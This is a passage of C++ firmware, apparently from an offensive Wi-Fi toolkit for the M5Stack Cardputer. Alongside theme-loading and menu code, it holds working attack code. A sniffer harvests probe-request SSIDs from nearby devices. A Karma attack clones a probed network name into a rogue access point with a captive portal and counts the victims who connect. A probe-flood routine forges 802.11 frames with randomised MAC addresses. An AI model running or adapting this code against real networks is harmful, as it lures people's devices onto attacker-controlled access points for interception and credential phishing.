  if (strcmp(colorName, "TFT_YELLOW") == 0) return TFT_YELLOW;
  if (strcmp(colorName, "TFT_WHITE") == 0) return TFT_WHITE;
  if (strcmp(colorName, "TFT_ORANGE") == 0) return TFT_ORANGE;
  if (strcmp(colorName, "TFT_GREENYELLOW") == 0) return TFT_GREENYELLOW;
  if (strcmp(colorName, "TFT_PINK") == 0) return TFT_PINK;
  if (strcmp(colorName, "TFT_BROWN") == 0) return TFT_BROWN;
  if (strcmp(colorName, "TFT_GOLD") == 0) return TFT_GOLD;
  // Can add your own colors via:
  // if (strcmp(colorName, "[CUSTOM_NAME]") == 0) return M5.Lcd.color565(uint8_t r,uint8_t g,uint8_t b);
  return -1; // Error Case
}

void restoreThemeParameters() {
  Serial.println(F("Opening Theme File: "));
  Serial.println(selectedTheme.c_str());
  IniFile ini(selectedTheme.c_str());
  if (!ini.open()) {
    Serial.println(F("Error opening INI file"));
    return;
  }

  const size_t bufferLen = 80;
  char valueBuffer[bufferLen]; // Buffer for reading string values
  IniFileState state; // Needed for the getValue calls

  // Read and assign each configuration value from the INI file
  if (!ini.getValue("theme", "taskbarBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read taskbarBackgroundColor"));
    return; // Exit if any key read fails
  }
  taskbarBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "taskbarTextColor", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read taskbarTextColor"));
    return;
  }
  taskbarTextColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "taskbarDividerColor", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read taskbarDividerColor"));
    return;
  }
  taskbarDividerColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read menuBackgroundColor"));
    return;
  }
  menuBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuSelectedBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read menuSelectedBackgroundColor"));
    return;
  }
  menuSelectedBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuTextFocusedColor", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read menuTextFocusedColor"));
    return;
  }
  menuTextFocusedColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuTextUnFocusedColor", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read menuTextUnFocusedColor"));
    return;
  }
  menuTextUnFocusedColor = getColorValue(valueBuffer);

  // Read the boolean value
  if (!ini.getValue("theme", "Colorful", valueBuffer, bufferLen)) {
    Serial.println(F("Failed to read Colorful"));
    return;
  }
  Colorful = (strncmp(valueBuffer, "true", 4) == 0);

  // Close the file
  ini.close();

  // Optionally, print the values to verify
  Serial.println(taskbarBackgroundColor);
  Serial.println(taskbarTextColor);
  Serial.println(taskbarDividerColor);
  Serial.println(menuBackgroundColor);
  Serial.println(menuSelectedBackgroundColor);
  Serial.println(menuTextFocusedColor);
  Serial.println(menuTextUnFocusedColor);
  Serial.println(Colorful ? "True" : "False");
}


/*
============================================================================================================================
Karma attack
============================================================================================================================
*/
void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (ssid_count_Karma == 0) {
    M5.Display.setCursor(8, M5.Display.height() / 2 - 10);
    M5.Display.println("Waiting for probe...");
  }

  if (frame_type == 0x40) { // Probe Request Frame
    uint8_t ssid_length_Karma = frame[25];
    if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
      char ssidKarma[33] = {0};
      memcpy(ssidKarma, &frame[26], ssid_length_Karma);
      ssidKarma[ssid_length_Karma] = '\0';
      if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
        return;
      }

      bool ssidExistsKarma = false;
      for (int i = 0; i < ssid_count_Karma; i++) {
        if (strcmp(ssidsKarma[i].data(), ssidKarma) == 0) {
          ssidExistsKarma = true;
          break;
        }
      }


      if (isSSIDWhitelisted(ssidKarma)) {
        if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
          seenWhitelistedSSIDs.insert(ssidKarma);
          Serial.println("SSID in whitelist, ignoring: " + String(ssidKarma));
        }
        return;
      }

      if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
        ensureKarmaStorage();
        strncpy(ssidsKarma[ssid_count_Karma].data(), ssidKarma, 32);
        ssidsKarma[ssid_count_Karma].data()[32] = '\0';
        updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
        Serial.print(F("Found: "));
        if (ledOn) {
          pixels.setPixelColor(0, pixels.Color(255, 0, 0));
          pixels.show();
          delay(50);

          pixels.setPixelColor(0, pixels.Color(0, 0, 0));
          pixels.show();
          delay(50);
        }
        Serial.println(ssidKarma);
      }
    }
  }
}

void saveSSIDToFile(const char* ssid) {
  bool ssidExists = false;
  File readfile = SD.open("/evil/probes.txt", FILE_READ);
  if (readfile) {
    while (readfile.available()) {
      String line = readfile.readStringUntil('\n');
      if (line.equals(ssid)) {
        ssidExists = true;
        break;
      }
    }
    readfile.close();
  }
  if (!ssidExists) {
    File file = SD.open("/evil/probes.txt", FILE_APPEND);
    if (file) {
      file.println(ssid);
      file.close();
    } else {
      Serial.println(F("Error opening probes.txt"));
    }
  }
}


void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
 const int maxLength = 22;
  char truncatedSSID[maxLength + 1];  // Adjusted size to maxLength to fix bufferoverflow

  M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 27, menuBackgroundColor);
  int startIndexKarma = max(0, count - maxMenuDisplay);

  for (int i = startIndexKarma; i < count; i++) {
    if (i >= MAX_SSIDS_Karma) {  // Safety check to avoid out-of-bounds access
      break;
    }

    int lineIndexKarma = i - startIndexKarma;
    M5.Display.setCursor(5, lineIndexKarma * 12);

    if (strlen(ssidsKarma[i].data()) > maxLength) {
      strncpy(truncatedSSID, ssidsKarma[i].data(), maxLength);
      truncatedSSID[maxLength] = '\0';  // Properly null-terminate
      M5.Display.printf("%d.%s", i + 1, truncatedSSID);
    } else {
      M5.Display.printf("%d.%s", i + 1, ssidsKarma[i].data());
    }
  }
  if (count <= 9) {
    M5.Display.fillRect(M5.Display.width() - 15 * 1.5 / 2, 0, 15 * 1.5 / 2, 15, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 13 * 1.5 / 2, 3);
  } else if (count >= 10 && count <= 99) {
    M5.Display.fillRect(M5.Display.width() - 30 * 1.5 / 2, 0, 30 * 1.5 / 2, 15, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 27 * 1.5 / 2, 3);
  } else if (count >= 100 && count < MAX_SSIDS_Karma * 0.7) {
    M5.Display.fillRect(M5.Display.width() - 45 * 1.5 / 2, 0, 45 * 1.5 / 2, 15, TFT_ORANGE);
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.setCursor(M5.Display.width() - 42 * 1.5 / 2, 3);
    M5.Display.setTextColor(TFT_WHITE);
  } else {
    M5.Display.fillRect(M5.Display.width() - 45 * 1.5 / 2, 0, 45 * 1.5 / 2, 15, TFT_RED);
    M5.Display.setCursor(M5.Display.width() - 42 * 1.5 / 2, 3);
  }
  if (count == MAX_SSIDS_Karma) {
    M5.Display.printf("MAX");
  } else {
    M5.Display.printf("%d", count);
  }
  M5.Display.display();
}


void drawStartButtonKarma() {
  M5.Display.clear();
  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_GREEN);
  M5.Display.setCursor(M5.Display.width() / 2 - 24 , M5.Display.height() - 20);
  M5.Display.setTextColor(TFT_BLACK);
  M5.Display.println("Start Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
  M5.Display.fillRect(0, M5.Display.height() - 27, M5.Display.width(), 27, TFT_RED);
  M5.Display.setCursor(M5.Display.width() / 2 - 60, M5.Display.height() - 20);
  M5.Display.println("Stop Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void startScanKarma() {
  isScanningKarma = true;
  ssid_count_Karma = 0;
  M5.Display.clear();
  drawStopButtonKarma();
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

  readConfigFile("/evil/config/config.txt");
  seenWhitelistedSSIDs.clear();

  Serial.println(F("-------------------"));
  Serial.println(F("Probe Sniffing Started..."));
  Serial.println(F("-------------------"));
}


void stopScanKarma() {
  Serial.println(F("-------------------"));
  Serial.println("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
  Serial.println(F("-------------------"));
  isScanningKarma = false;
  esp_wifi_set_promiscuous(false);


  if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
    Serial.println(F("Saving SSIDs to SD card automatically..."));
    for (int i = 0; i < ssid_count_Karma; i++) {
      saveSSIDToFile(ssidsKarma[i].data());
    }
    Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
  } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
    delay(1500);
    bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
    if (saveSSID) {
      M5.Display.clear();
      M5.Display.setCursor(5 , M5.Display.height() / 2 );
      M5.Display.println("Saving SSIDs on SD..");
      for (int i = 0; i < ssid_count_Karma; i++) {
        saveSSIDToFile(ssidsKarma[i].data());
      }
      M5.Display.clear();
      M5.Display.setCursor(5 , M5.Display.height() / 2 );
      M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println(F("-------------------"));
      Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println(F("-------------------"));
    } else {
      M5.Display.clear();
      M5.Display.setCursor(5 , M5.Display.height() / 2 );
      M5.Display.println("  No SSID saved.");
    }
    delay(1000);
    for (int i = 0; i < (int)ssidsKarma.size(); ++i) ssidsKarma[i].fill('\0');
    ssid_count_Karma = 0;
  }


  menuSizeKarma = ssid_count_Karma;
  currentIndexKarma = 0;
  menuStartIndexKarma = 0;

  if (isKarmaMode && ssid_count_Karma > 0) {
    drawMenuKarma();
    currentStateKarma = StopScanKarma;
  } else {
    currentStateKarma = StartScanKarma;
    inMenu = true;
    drawMenu();
  }
  isKarmaMode = false;
  isProbeSniffingMode = false;
  stopProbeSniffingViaSerial = false;
}


void handleMenuInputKarma() {
  bool stateChanged = false;
  static unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires
  static bool keyHandled = false;
  enterDebounce();
  M5.update();
  M5Cardputer.update();

  if (millis() - lastKeyPressTime > debounceDelay) {
    if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
      currentIndexKarma--;
      if (currentIndexKarma < 0) {
        currentIndexKarma = menuSizeKarma - 1; // Boucle retour Ã  la fin si en dessous de zÃ©ro
      }
      stateChanged = true;
      lastKeyPressTime = millis();
      keyHandled = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
      currentIndexKarma++;
      if (currentIndexKarma >= menuSizeKarma) {
        currentIndexKarma = 0; // Boucle retour au dÃ©but si dÃ©passÃ© la fin
      }
      stateChanged = true;
      lastKeyPressTime = millis();
      keyHandled = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
      executeMenuItemKarma(currentIndexKarma);
      stateChanged = true;
      lastKeyPressTime = millis();
      keyHandled = true;
    }

    // RÃ©initialisation de keyHandled si aucune des touches concernÃ©es n'est actuellement pressÃ©e
    if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      keyHandled = false;
    }
  }

  if (stateChanged) {
    // Ajustement de l'indice de dÃ©part pour l'affichage du menu si nÃ©cessaire
    menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
    drawMenuKarma();  // Redessiner le menu avec le nouvel indice sÃ©lectionnÃ©
  }
}

void drawMenuKarma() {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextFont(1);

  int lineHeight = 12;
  int startX = 0;
  int startY = 6;

  for (int i = 0; i < maxMenuDisplayKarma; i++) {
    int menuIndexKarma = menuStartIndexKarma + i;
    if (menuIndexKarma >= menuSizeKarma) break;

    if (menuIndexKarma == currentIndexKarma) {
      M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
      M5.Display.setTextColor(menuTextFocusedColor);
    } else {
      M5.Display.setTextColor(menuTextUnFocusedColor);
    }
    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 11);
    M5.Display.println(ssidsKarma[menuIndexKarma].data());
  }
  M5.Display.display();
}

void executeMenuItemKarma(int indexKarma) {
  if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
    startAPWithSSIDKarma(ssidsKarma[indexKarma].data());
  } else {
    M5.Display.clear();
    M5.Display.println("Selection invalide!");
    delay(1000);
    drawStartButtonKarma();
    currentStateKarma = StartScanKarma;
  }
}

void startAPWithSSIDKarma(const char* ssid) {
  clonedSSID = String(ssid);
  isProbeKarmaAttackMode = true;
  readConfigFile("/evil/config/config.txt");
  createCaptivePortal();

  Serial.println(F("-------------------"));
  Serial.println("Karma Attack started for : " + String(ssid));
  Serial.println(F("-------------------"));

  M5.Display.clear();
  unsigned long startTime = millis();
  unsigned long currentTime;
  int remainingTime;
  int clientCount = 0;
  int scanTimeKarma = 60; // Scan time for karma attack (not for Karma Auto)
  enterDebounce();
  
  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();
    currentTime = millis();
    remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
    clientCount = WiFi.softAPgetStationNum();
    M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 25);
    M5.Display.println(String(ssid));

    M5.Display.setCursor(10, 45);
    M5.Display.print("Left Time: ");
    M5.Display.print(remainingTime);
    M5.Display.println(" s ");

    M5.Display.setCursor(10, 65);
    M5.Display.print("Connected Client: ");
    M5.Display.println(clientCount);

    Serial.println(F("---Karma-Attack---"));
    Serial.println("On :" + String(ssid));
    Serial.println("Left Time: " + String(remainingTime) + "s ");
    Serial.println("Connected Client: " + String(clientCount));
    Serial.println(F("-------------------"));

    M5.Lcd.setTextColor(menuTextUnFocusedColor);
    M5.Display.setCursor(33, 110);
    M5.Display.println(" Stop");
    M5.Display.display();

    if (remainingTime <= 0) {
      break;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      break;
    } else {
      delay(200);
    }

  }
  M5.Display.clear();
  M5.Display.setCursor(15 , M5.Display.height() / 2 );
  if (clientCount > 0) {
    M5.Display.println("Karma Successful!!!");
    Serial.println(F("-------------------"));
    Serial.println(F("Karma Attack worked !"));
    Serial.println(F("-------------------"));
  } else {
    M5.Display.println(" Karma Failed...");
    Serial.println(F("-------------------"));
    Serial.println(F("Karma Attack failed..."));
    Serial.println(F("-------------------"));
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
  delay(2000);
  if (confirmPopup("Save " + String(ssid) + " ?" )) {
    saveSSIDToFile(ssid);
  }
  lastIndex = -1;
  inMenu = true;
  isProbeKarmaAttackMode = false;
  currentStateKarma = StartScanKarma;
  for (size_t i = 0; i < ssidsKarma.size(); ++i) ssidsKarma[i].fill('\0');
  ssid_count_Karma = 0;
  drawMenu();
}


/*
============================================================================================================================
List probes
============================================================================================================================
*/
void listProbes() {
  File file = SD.open("/evil/probes.txt", FILE_READ);
  if (!file) {
    Serial.println(F("Failed to open probes.txt"));
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    Serial.println(F("No probes found"));
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int lineHeight = 15; // Hauteur de ligne pour l'affichage des SSIDs
  const int maxDisplay = 9; // Nombre maximum de lignes affichables
  int currentListIndex = 0;
  bool needDisplayUpdate = true;
  bool keyHandled = false;

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires
  enterDebounce();
  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        currentListIndex = (currentListIndex + 1) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        Serial.println("SSID selected: " + probes[currentListIndex]);
        clonedSSID = probes[currentListIndex];
        waitAndReturnToMenu(probes[currentListIndex] + " selected");
        return; // Sortie de la fonction aprÃ¨s sÃ©lection
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      int y = 1; // DÃ©but de l'affichage en y

      for (int i = 0; i < maxDisplay; i++) {
        int probeIndex = (currentListIndex + i) % numProbes;
        if (i == 0) { // Mettre en Ã©vidence la sonde actuellement sÃ©lectionnÃ©e
          M5.Display.fillRect(0, y, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor);
        }
        M5.Display.setCursor(5, y);
        M5.Display.println(probes[probeIndex]);
        y += lineHeight;
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }
  }
}

/*
============================================================================================================================
Delete unique probe
============================================================================================================================
*/
void deleteProbe() {
  File file = SD.open("/evil/probes.txt", FILE_READ);
  if (!file) {
    Serial.println(F("Failed to open probes.txt"));
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int lineHeight = 15;  // AdaptÃ© Ã  l'Ã©cran de 128x128
  const int maxDisplay = 8;  // Calcul du nombre maximal de lignes affichables
  int currentListIndex = 0;
  bool needDisplayUpdate = true;
  bool keyHandled = false;

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires
  enterDebounce();
  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        currentListIndex = (currentListIndex + 1) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        keyHandled = true;
        if (confirmPopup("Delete " + probes[currentListIndex] + " probe?")) {
          bool success = removeProbeFromFile("/evil/probes.txt", probes[currentListIndex]);
          if (success) {
            Serial.println(probes[currentListIndex] + " deleted");
            waitAndReturnToMenu(probes[currentListIndex] + " deleted");
          } else {
            waitAndReturnToMenu("Error deleting probe");
          }
          return; // Exit after handling delete
        } else {
          waitAndReturnToMenu("Return to menu");
          return;
        }
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);

      for (int i = 0; i < maxDisplay && i + currentListIndex < numProbes; i++) {
        int probeIndex = currentListIndex + i;
        String ssid = probes[probeIndex];
        ssid = ssid.substring(0, min(ssid.length(), (unsigned int)21));  // Tronquer pour l'affichage
        M5.Display.setCursor(5, i * lineHeight + 10);
        M5.Display.setTextColor(probeIndex == currentListIndex ? menuTextFocusedColor : menuTextUnFocusedColor);
        M5.Display.println(ssid);
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }
  }
}



int showProbesAndSelect(String probes[], int numProbes) {
  const int lineHeight = 18;  // AdaptÃ© Ã  l'Ã©cran de 128x128
  const int maxDisplay = (128 - 10) / lineHeight;  // Calcul du nombre maximal de lignes affichables
  int currentListIndex = 0;  // Index de l'Ã©lÃ©ment actuel dans la liste
  int selectedIndex = -1;  // -1 signifie aucune sÃ©lection
  bool needDisplayUpdate = true;
  bool keyHandled = false;

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires

  while (selectedIndex == -1) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        currentListIndex = (currentListIndex + 1) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        selectedIndex = currentListIndex;
        keyHandled = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);

      for (int i = 0; i < maxDisplay && currentListIndex + i < numProbes; i++) {
        int displayIndex = currentListIndex + i;
        M5.Display.setCursor(10, i * lineHeight + 10);
        M5.Display.setTextColor(displayIndex == currentListIndex ? menuTextFocusedColor : menuTextUnFocusedColor);  // Highlight the current element
        M5.Display.println(probes[displayIndex]);
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }
  }

  return selectedIndex;
}


bool removeProbeFromFile(const char* filepath, const String & probeToRemove) {
  File originalFile = SD.open(filepath, FILE_READ);
  if (!originalFile) {
    Serial.println(F("Failed to open the original file for reading"));
    return false;
  }

  const char* tempFilePath = "/evil/temp.txt";
  File tempFile = SD.open(tempFilePath, FILE_WRITE);
  if (!tempFile) {
    Serial.println(F("Failed to open the temp file for writing"));
    originalFile.close();
    return false;
  }

  bool probeRemoved = false;
  while (originalFile.available()) {
    String line = originalFile.readStringUntil('\n');
    if (line.endsWith("\r")) {
      line = line.substring(0, line.length() - 1);
    }

    if (!probeRemoved && line == probeToRemove) {
      probeRemoved = true;
    } else {
      tempFile.println(line);
    }
  }

  originalFile.close();
  tempFile.close();

  SD.remove(filepath);
  SD.rename(tempFilePath, filepath);

  return probeRemoved;
}

/*
============================================================================================================================
Delete all probes
============================================================================================================================
*/
void deleteAllProbes() {
  if (confirmPopup("Delete All Probes ?")) {
    File file = SD.open("/evil/probes.txt", FILE_WRITE);
    if (file) {
      file.close();
      waitAndReturnToMenu("Deleted successfully");
      Serial.println(F("-------------------"));
      Serial.println(F("Probes deleted successfully"));
      Serial.println(F("-------------------"));
    } else {
      waitAndReturnToMenu("Error..");
      Serial.println(F("-------------------"));
      Serial.println(F("Error opening file for deletion"));
      Serial.println(F("-------------------"));
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}

//KARMA-PART-FUNCTIONS-END


/*
============================================================================================================================
Probes Attack
============================================================================================================================
*/

uint8_t originalMAC[6];

void saveOriginalMAC() {
  esp_wifi_get_mac(WIFI_IF_STA, originalMAC);
}

void restoreOriginalMAC() {
  esp_wifi_set_mac(WIFI_IF_STA, originalMAC);
}

String generateRandomSSID(int length) {
  const char charset[] PROGMEM = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  String randomString;
  for (int i = 0; i < length; i++) {
    int index = random(0, sizeof(charset) - 1);
    randomString += charset[index];
  }
  return randomString;
}

String generateRandomMAC() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_STA() {
  String mac = generateRandomMAC();
  uint8_t macArray[6];
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);
  esp_wifi_set_mac(WIFI_IF_STA, macArray);
  delay(50);
}



std::vector<String> readCustomProbes(const char* filename) {
  File file = SD.open(filename, FILE_READ);
  std::vector<String> customProbes;

  if (!file) {
    Serial.println(F("Failed to open file for reading"));
    return customProbes;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("CustomProbes=")) {
      String probesStr = line.substring(String("CustomProbes=").length());
      int idx = 0;
      while ((idx = probesStr.indexOf(',')) != -1) {
        customProbes.push_back(probesStr.substring(0, idx));
        probesStr = probesStr.substring(idx + 1);
      }
      if (probesStr.length() > 0) {
        customProbes.push_back(probesStr);
      }
      break;
    }
  }
  file.close();
  return customProbes;
}

void sendProbeRequest(const char* ssid) {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }

  uint8_t packet[128] = {
    0x40, 0x00,             // Type/Subtype: Probe Request
    0x00, 0x00,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source MAC
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
    0x00, 0x00              // Seq ctrl
  };

  int pos = 24;

  // SSID tag
  packet[pos++] = 0x00; // SSID Tag Number
  int ssidLen = strlen(ssid);
  packet[pos++] = ssidLen;
  memcpy(&packet[pos], ssid, ssidLen);
  pos += ssidLen;

  // Supported Rates tag
  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(&packet[pos], rates, sizeof(rates));
  pos += sizeof(rates);

  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}


int checkNb = 0;
bool useCustomProbes;
std::vector<String> customProbes;

void probeAttack() {
  WiFi.mode(WIFI_MODE_STA);
  isProbeAttackRunning = true;
  useCustomProbes = false;

  if (!isItSerialCommand) {
    useCustomProbes = confirmPopup("Use custom probes?");
    M5.Display.clear();
    if (useCustomProbes) {
      customProbes = readCustomProbes("/evil/config/config.txt");
    } else {
      customProbes.clear();
    }
  } else {
    M5.Display.clear();
    isItSerialCommand = false;
    customProbes.clear();
  }
  int ssidIndex = 0;
  int macChangeRate = 1; // Change MAC tous les 10 probes
  int channelHopRate = 1; // Change canal tous les 30 probes
  int probeCount = 0;
  int delayTime = 25;
  unsigned long previousMillis = 0;
  const int debounceDelay = 200;
  unsigned long lastDebounceTime = 0;

  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
  M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 20);
  M5.Display.setTextColor(TFT_WHITE,TFT_RED);
  M5.Display.println("Stop");
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);

  int probesTextX = 0;
  M5.Display.setCursor(probesTextX, 37);
  M5.Display.println("Probes attack running...");
  M5.Display.setCursor(probesTextX, 52);
  M5.Display.print("Probes sent: ");

  Serial.println(F("-------------------"));
  Serial.println(F("Starting Probes attack"));
